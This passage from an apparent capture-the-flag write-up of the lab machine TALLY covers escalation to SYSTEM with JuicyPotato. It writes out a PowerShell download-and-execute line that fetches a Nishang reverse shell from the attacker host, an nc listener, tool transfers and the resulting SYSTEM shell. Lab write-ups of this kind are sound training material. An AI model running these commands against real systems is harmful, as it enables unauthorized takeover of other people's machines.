+                -a----&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;17<span style="color:#ff9d00;font-weight:700">/</span>09<span style="color:#ff9d00;font-weight:700">/</span>2017&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;21<span style="color:#ff9d00;font-weight:700">:</span>49&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;936&nbsp;zz_Migration.lnk<br>
+                <br>
+                PS&nbsp;C<span style="color:#ff9d00;font-weight:700">:</span><span style="color:#333333;font-weight:400">\U</span>sers<span style="color:#333333;font-weight:400">\S</span>arah<span style="color:#333333;font-weight:400">\D</span>esktop&gt;&nbsp;<span style="color:#ff9d00;font-weight:700">type</span>&nbsp;user.txt<br>
+                be72362e8d...
+            </div>
+        </div><br>
+        <br>
+        <a id="h1-3" name="h1-3"></a><strong></strong>
+        <h1><strong>Priv-Esc to SYSTEM</strong></h1>
+        <br>
+        <a id="h2-6" name="h2-6"></a><strong></strong>
+        <h2><strong>6) JuicyPotato.exe</strong></h2><br>
+        Sarah is running the MSSQL service, which means she most likely has SeImpersonatePrivilege privileges enabled.<br>
+        Check with <code>whoami /priv</code>.<br>
+            <div class="codebox">
+                PS&nbsp;C<span style="color:#ff9d00;font-weight:700">:</span><span style="color:#333333;font-weight:400">\t</span>emp&gt;&nbsp;<span style="color:#ff9d00;font-weight:700">whoami</span>&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>priv<br>
+                <br>
+                PRIVILEGES&nbsp;INFORMATION<br>
+                ----------------------<br>
+                <br>
+                Privilege&nbsp;Name&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Description&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;State&nbsp;&nbsp;&nbsp;<br>
+                =============================&nbsp;=========================================&nbsp;========<br>
+                SeAssignPrimaryTokenPrivilege&nbsp;Replace&nbsp;a&nbsp;process&nbsp;level&nbsp;token&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Disabled<br>
+                SeIncreaseQuotaPrivilege&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Adjust&nbsp;memory&nbsp;quotas&nbsp;<span style="color:#ff9d00;font-weight:700">for</span>&nbsp;<span style="color:#7f0044;font-weight:400">a</span>&nbsp;process&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Disabled<br>
+                SeChangeNotifyPrivilege&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Bypass&nbsp;traverse&nbsp;checking&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Enabled&nbsp;<br>
+                SeImpersonatePrivilege&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Impersonate&nbsp;a&nbsp;client&nbsp;after&nbsp;authentication&nbsp;Enabled&nbsp;<br>
+                SeCreateGlobalPrivilege&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Create&nbsp;global&nbsp;objects&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Enabled&nbsp;<br>
+                SeIncreaseWorkingSetPrivilege&nbsp;Increase&nbsp;a&nbsp;process&nbsp;working&nbsp;set&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Disabled
+            </div>
+        </div><br>
+        <br>
+        She does!<br>
+        This means we should be able to elevate to <code>SYSTEM</code> using the <code>JuicyPotato</code> exploit.<br>
+        <a href="https://github.com/ohpe/juicy-potato">https://github.com/ohpe/juicy-potato</a><br>
+        <br>
+        First, create a <code>.bat</code> file containing the <code>cmd</code> commands you'd like JuicyPotato to run as SYSTEM.<br>
+        I wrote a Nishang reverse shell.<br>
+            <div class="codebox">
+                ┌─[root@parrot]─[<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>tally<span style="color:#ff9d00;font-weight:700">/</span>serve]<br>
+                └──╼&nbsp;<span style="color:#0088ff;font-weight:400">#nano&nbsp;commands.bat</span><br>
+                powershell&nbsp;<span style="color:#3ad900;font-weight:400">"IEX&nbsp;(New-Object&nbsp;Net.WebClient).DownloadString('http://10.10.14.7:8000/nishang9002.ps1')"</span>
+            </div>
+        </div><br>
+        <br>
+        Download <code>JuicyPotato.exe</code> to your attacking machine.<br>
+            <div class="codebox">
+                ┌─[root@parrot]─[<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>tally<span style="color:#ff9d00;font-weight:700">/</span>serve]<br>
+                └──╼&nbsp;<span style="color:#0088ff;font-weight:400">#wget&nbsp;-q&nbsp;https://github.com/ohpe/juicy-potato/releases/download/v0.1/JuicyPotato.exe</span>
+            </div>
+        </div><br>
+        <br>
+        Start a python web server to serve the <code>commands.bat</code> and the <code>JuicyPotato.exe</code> files to the target.<br>
+            <div class="codebox">
+                ┌─[root@parrot]─[<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>tally<span style="color:#ff9d00;font-weight:700">/</span>serve]<br>
+                └──╼&nbsp;<span style="color:#0088ff;font-weight:400">#python&nbsp;-m&nbsp;SimpleHTTPServer&nbsp;</span><br>
+                Serving&nbsp;HTTP&nbsp;on&nbsp;0.0.0.0&nbsp;port&nbsp;8000&nbsp;...
+            </div>
+        </div><br>
+        <br>
+        And download them into <code>C:\temp</code> on the target.<br>
+            <div class="codebox">
+                PS&nbsp;C<span style="color:#ff9d00;font-weight:700">:</span><span style="color:#333333;font-weight:400">\U</span>sers<span style="color:#333333;font-weight:400">\S</span>arah<span style="color:#333333;font-weight:400">\D</span>esktop&gt;&nbsp;<span style="color:#ff9d00;font-weight:700">cd</span>&nbsp;C<span style="color:#ff9d00;font-weight:700">:</span><span style="color:#333333;font-weight:400">\t</span>emp<br>
+                PS&nbsp;C<span style="color:#ff9d00;font-weight:700">:</span><span style="color:#333333;font-weight:400">\t</span>emp&gt;&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>New-Object&nbsp;Net.WebClient<span style="color:#ff9d00;font-weight:700">)</span>.downloadFile<span style="color:#ff9d00;font-weight:700">(</span><span style="color:#3ad900;font-weight:400">'http://10.10.14.7:8000/commands.bat'</span>,<span style="color:#3ad900;font-weight:400">'C:\temp\commands.bat'</span><span style="color:#ff9d00;font-weight:700">)</span><br>
+                PS&nbsp;C<span style="color:#ff9d00;font-weight:700">:</span><span style="color:#333333;font-weight:400">\t</span>emp&gt;&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>New-Object&nbsp;Net.WebClient<span style="color:#ff9d00;font-weight:700">)</span>.downloadFile<span style="color:#ff9d00;font-weight:700">(</span><span style="color:#3ad900;font-weight:400">'http://10.10.14.7:8000/JuicyPotato.exe'</span>,<span style="color:#3ad900;font-weight:400">'C:\temp\JuicyPotato.exe'</span><span style="color:#ff9d00;font-weight:700">)</span>
+            </div>
+        </div><br>
+        <br>
+        Start a listener to receive your reverse shell.<br>
+            <div class="codebox">
+                ┌─[✗]─[root@parrot]─[<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>tally]<br>
+                └──╼&nbsp;<span style="color:#0088ff;font-weight:400">#nc&nbsp;-lvnp&nbsp;9002</span><br>
+                listening&nbsp;on&nbsp;[any]&nbsp;9002&nbsp;...
+            </div>
+        </div><br>
+        <br>
+        Run <code>JuicyPotato.exe</code>.<br>
+            <div class="codebox">
+                PS&nbsp;C<span style="color:#ff9d00;font-weight:700">:</span><span style="color:#333333;font-weight:400">\t</span>emp&gt;&nbsp;.<span style="color:#333333;font-weight:400">\J</span>uicyPotato.exe&nbsp;-t&nbsp;*&nbsp;-p&nbsp;commands.bat&nbsp;-l&nbsp;6767<br>
+                Testing&nbsp;<span style="color:#ff9d00;font-weight:700">{</span>4991d34b-80a1-4291-83b6-3328366b9097<span style="color:#ff9d00;font-weight:700">}</span>&nbsp;6767<br>
+                COM&nbsp;-&gt;&nbsp;recv&nbsp;failed&nbsp;with&nbsp;error<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;10038
+            </div>
+        </div><br>
+        <br>
+        It fails with the default BITS CLSID.<br>
+        If this happens, refer to the CLSID section of the github page, which lists CLSIDs for most Windows versions.<br>
+        TALLY is Windows Server 2016.<br>
+        <a href="https://github.com/ohpe/juicy-potato/blob/master/CLSID/README.md">https://github.com/ohpe/juicy-potato/blob/master/CLSID/README.md</a><br>
+        <br>
+        <code>wuauserv</code>, the windows update service, is usually a safe bet because it exists on all systems, but the <code>XblGameSave</code> CLSID worked for me.<br>
+            <div class="codebox">
+                PS&nbsp;C<span style="color:#ff9d00;font-weight:700">:</span><span style="color:#333333;font-weight:400">\t</span>emp&gt;&nbsp;.<span style="color:#333333;font-weight:400">\J</span>uicyPotato.exe&nbsp;-t&nbsp;*&nbsp;-p&nbsp;commands.bat&nbsp;-l&nbsp;1337&nbsp;-c&nbsp;<span style="color:#3ad900;font-weight:400">"{F7FD3FD6-9994-452D-8DA7-9A8FD87AEEF4}"</span><br>
+                Testing&nbsp;<span style="color:#ff9d00;font-weight:700">{</span>F7FD3FD6-9994-452D-8DA7-9A8FD87AEEF4<span style="color:#ff9d00;font-weight:700">}</span>&nbsp;1337<br>
+                ......<br>
+                [+]&nbsp;authresult&nbsp;0<br>
+                <span style="color:#ff9d00;font-weight:700">{</span>F7FD3FD6-9994-452D-8DA7-9A8FD87AEEF4<span style="color:#ff9d00;font-weight:700">};</span>NT&nbsp;AUTHORITY<span style="color:#333333;font-weight:400">\S</span>YSTEM<br>
+                <br>
+                [+]&nbsp;CreateProcessWithTokenW&nbsp;OK
+            </div>
+        </div><br>
+        <br>
+        Be patient, 30 seconds or so.<br>
+        You should see a connection on your listener.<br>
+            <div class="codebox">
+                listening&nbsp;on&nbsp;[any]&nbsp;9002&nbsp;...<br>
+                connect&nbsp;to&nbsp;[10.10.14.7]&nbsp;from&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>UNKNOWN<span style="color:#ff9d00;font-weight:700">)</span>&nbsp;[10.10.10.59]&nbsp;52182<br>
+                Windows&nbsp;PowerShell&nbsp;running&nbsp;as&nbsp;user&nbsp;TALLY$&nbsp;on&nbsp;TALLY<br>
+                Copyright&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>C<span style="color:#ff9d00;font-weight:700">)</span>&nbsp;2015&nbsp;Microsoft&nbsp;Corporation.&nbsp;All&nbsp;rights&nbsp;reserved.<br>
+                <br>
+                PS&nbsp;C<span style="color:#ff9d00;font-weight:700">:</span><span style="color:#333333;font-weight:400">\W</span>indows<span style="color:#333333;font-weight:400">\s</span>ystem32<span style="color:#ffdd00;font-weight:400">&gt;</span><span style="color:#ff9d00;font-weight:700">whoami</span><br>
+                nt&nbsp;authority<span style="color:#333333;font-weight:400">\s</span>ystem
+            </div>
+        </div><br>
+        <br>
+        We're SYSTEM.<br>
+        Go grab root.txt :)<br>
+            <div class="codebox">
+                PS&nbsp;C<span style="color:#ff9d00;font-weight:700">:</span><span style="color:#333333;font-weight:400">\W</span>indows<span style="color:#333333;font-weight:400">\s</span>ystem32&gt;&nbsp;<span style="color:#ff9d00;font-weight:700">cd</span>&nbsp;C<span style="color:#ff9d00;font-weight:700">:</span><span style="color:#333333;font-weight:400">\U</span>sers<span style="color:#333333;font-weight:400">\A</span>dministrator<span style="color:#333333;font-weight:400">\D</span>esktop<br>
+                PS&nbsp;C<span style="color:#ff9d00;font-weight:700">:</span><span style="color:#333333;font-weight:400">\U</span>sers<span style="color:#333333;font-weight:400">\A</span>dministrator<span style="color:#333333;font-weight:400">\D</span>esktop&gt;&nbsp;<span style="color:#ff9d00;font-weight:700">dir</span>&nbsp;-force<br>
+                <br>
+                <br>
+                &nbsp;&nbsp;&nbsp;&nbsp;Directory<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;C<span style="color:#ff9d00;font-weight:700">:</span><span style="color:#333333;font-weight:400">\U</span>sers<span style="color:#333333;font-weight:400">\A</span>dministrator<span style="color:#333333;font-weight:400">\D</span>esktop<br>
+                <br>
+                <br>
+                Mode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;LastWriteTime&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Length&nbsp;Name&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<br>
+                ----&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;-------------&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;------&nbsp;----&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<br>
+                -a-hs-&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;8<span style="color:#ff9d00;font-weight:700">/</span>30<span style="color:#ff9d00;font-weight:700">/</span>2017&nbsp;&nbsp;&nbsp;7<span style="color:#ff9d00;font-weight:700">:</span>17&nbsp;AM&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;282&nbsp;desktop.ini&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<br>
+                -ar---&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;8<span style="color:#ff9d00;font-weight:700">/</span>31<span style="color:#ff9d00;font-weight:700">/</span>2017&nbsp;&nbsp;&nbsp;2<span style="color:#ff9d00;font-weight:700">:</span>03&nbsp;AM&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;32&nbsp;root.txt&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<br>
+                <br>
+                <br>
+                PS&nbsp;C<span style="color:#ff9d00;font-weight:700">:</span><span style="color:#333333;font-weight:400">\U</span>sers<span style="color:#333333;font-weight:400">\A</span>dministrator<span style="color:#333333;font-weight:400">\D</span>esktop&gt;&nbsp;<span style="color:#ff9d00;font-weight:700">type</span>&nbsp;root.txt<br>
+                608bb7073481...
+            </div>
+        </div>
+    </writeup>
+</section>
+
+</body>
+</html>
